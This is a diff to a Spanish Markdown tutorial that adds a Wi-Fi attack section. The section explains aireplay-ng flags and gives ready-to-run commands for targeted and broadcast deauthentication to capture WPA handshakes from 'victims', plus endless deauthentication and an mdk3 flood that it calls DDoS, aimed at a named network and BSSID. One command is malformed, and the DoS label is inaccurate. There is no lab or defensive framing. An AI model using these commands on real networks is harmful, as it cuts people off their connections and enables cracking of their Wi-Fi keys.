@@ -11,10 +11,11 @@
 * [Ver puntos de acceso cercanos](#item4)
 * [Seleccionada la victima vamos a especificar el escaneo para indagar en ella](#item5)
 * [Guardar un .cap de la victima seleccionada para posteriormente trabajar sobre el](#item6)
-## Fase de Explotacion en WEB 
-
-* [Contenido 7](#item7)
- 
+## Tecnicas de Ataque 
+* [Explicacion de operadoresusados de aireplay-ng](#item7.0)
+* [ATAQUE DE DESAUTENTIFICACION DIRIGIDO](#item7)
+* [ATAQUE DE DESAUTENTIFICACION GLOBAL](#item8)
+* [ATAQUE DDOS (DENIED OF SERVICE)](#item9)
  
 <a name="item1"></a>
 ### Chequeo de tarjeta y resolucion de conflictos
@@ -119,3 +120,63 @@ En este caso se llama WLAN0 por lo que para ponerla en modo monitor seria :
 
  
 [Subir](#top)
+
+<a name="item7.0"></a>
+### Explicacion de operadoresusados de aireplay-ng:
+    
+    -0 Ataque de desautentificacion
+    -1 Ataque de Autentificacion (solo usar en WEP EN WPA Y WPA2 NO SIRVE DE NADA)
+    10 numero de paquetes de desautentificacion que enviaremos
+    -e ESSID (Ejemplo MovistarE34A )
+    -c Mac del cliente conectado que queremos desautenticar 
+    wlan0mon Nuestra interfaz de red (obvio xD)
+    -h MAC ADDRESS falsa para injectar en un punto de acceso 
+
+<a name="item7"></a>
+### ATAQUE DE DESAUTENTIFICACION DIRIGIDO
+
+SINOPSIS: Expulsaremos un cliente conectado a una red , para forzar que conecte de 
+        nuevo y conseguir interceptar el Hankshake  
+--Procedemos a almacenar datos de la victima en el fichero Captura 
+
+``` $ airodump-ng -c 1 -w Captura --essid MovistarE34A wlan0mon ```
+
+--En otra consola , procedemos a desautenticar al cliente visitar **1 para entender parametros 
+
+``` $ aireplay-ng -0 10 -e MovistarE34A -c MACDELCLIENTE wlan0mon ```
+
+<a name="item8"></a>
+### ATAQUE DE DESAUTENTIFICACION GLOBAL
+
+SINOPSIS: Expulsaremos todos los clientes conectados a una red , para forzar que conecten de 
+        nuevo y conseguir interceptar el Hankshake  
+--Procedemos a almacenar datos de las victimas en el fichero Captura 
+
+``` $ airodump -c 1 -w Captura --essid MovistarE34A -c MacVictima wlan0mon ```
+
+--En otra consola , procedemos a desautenticar a los clientes visitar  
+
+``` $ aireplay-ng -0 10 -e MovistarE34A -c FF:FF:FF:FF:FF:FF wlan0mon ```
+
+<a name="item9"></a>
+### ATAQUE DDOS (DENIED OF SERVICE)
+
+SINOPSIS: Expulsaremos todos los clientes conectados a una red ,durante un tiempo ilimitado
+        hasta que cerremos el script con crtl+c
+--En consola , ponemos el numero de veces que se desautenticara a 0(infinito) y todo el mundo sin conexion  
+
+``` $ aireplay-ng -0 0 -e MovistarE34A -c FF:FF:FF:FF:FF:FF wlan0mon ```
+
+--Otra manera de hacer un DDOS a la red seria( en -a se pone el BSSID del router objetivo :
+
+``` $ mdk3 wlan0mon a -a 00:15:dc:5c:61:2f ```
+
+
+
+
+
+
+
+
+
+
